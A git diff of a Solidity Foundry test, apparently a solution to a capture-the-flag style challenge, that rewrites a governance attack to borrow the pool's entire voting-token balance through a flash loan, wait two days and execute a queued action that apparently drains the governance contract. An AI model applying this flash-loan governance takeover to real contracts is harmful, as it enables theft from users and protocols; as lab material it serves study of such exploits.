@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import {console2} from "forge-std/Test.sol";
 import {UtilsTest} from "./Utils.t.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SimpleGovernanceTest is UtilsTest {
     function setUp() public override {
@@ -14,27 +15,17 @@ contract SimpleGovernanceTest is UtilsTest {
     }
 
     function testAttack() public {
-        dvtVotes.transfer(address(target), (dvtVotes.totalSupply() + 10) / 2);
-
         // Activate voting power
         vm.startPrank(address(target));
-
-        dvtVotes.delegate(address(target));
-        dvtVotes.getVotes(address(target));
-        dvtVotes.balanceOf(address(target));
-
-        simpleGovernance.queueAction(
-            address(target),
-            uint128(address(simpleGovernance).balance),
+        pool.flashLoan(
+            IERC3156FlashBorrower(target),
+            address(dvtVotes),
+            dvtVotes.balanceOf(address(pool)),
             ""
         );
 
-        simpleGovernance.getAction(1);
-
         vm.warp(block.timestamp + 2 days);
-
-        simpleGovernance.executeAction(1);
-
-        console2.log(address(target).balance);
+        target.execute();
+        vm.stopPrank();
     }
 }
